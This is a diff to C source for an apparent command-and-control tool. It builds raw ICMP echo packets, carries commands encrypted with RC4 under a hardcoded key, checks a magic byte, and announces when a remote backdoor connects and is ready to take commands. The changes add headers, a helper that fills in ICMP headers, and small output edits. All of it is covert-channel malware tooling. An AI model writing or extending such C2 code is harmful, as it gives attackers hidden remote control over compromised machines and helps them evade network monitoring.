@@ -1,9 +1,13 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
 #include "../include/c2.h"
 #include "../include/rc4.h"
 
 #define KEY "thisisapassword"
 #define KEY_LENGTH 15
-#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}
 
 // creates a raw ICMP socket and binds it
 int create_socket(char *interface_to_bind) {
@@ -89,7 +93,7 @@ int check_magic_byte(struct icmphdr *icmp) {
 // print from where we got our connection
 void print_connection_succeed(char *src_ip) {
     printf("[!] Got a connection from %s\n", src_ip);
-    printf("[!] Now you should be able to run your commands\n");
+    puts("[!] Now you should be able to run your commands");
 }
 
 // prep'ing the IP headers for later usage
@@ -108,6 +112,13 @@ unsigned char *parse_data_section(unsigned char *packet) {
     unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
 
     return data;
+}
+
+// prep'ing the ICMP headers & setting up the checksum
+void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum) {
+    icmp->checksum = checksum;
+    icmp->type = 8;
+    icmp->un.echo.id = 9001;
 }
 
 // append the command to the data section of the packet
@@ -136,6 +147,7 @@ void interact(int sockfd) {
 
     input = malloc(BUFFER_SIZE);
     CHECK_ALLOC(input);
+
     packet = (unsigned char *) malloc(packet_size);
     CHECK_ALLOC(packet);
 
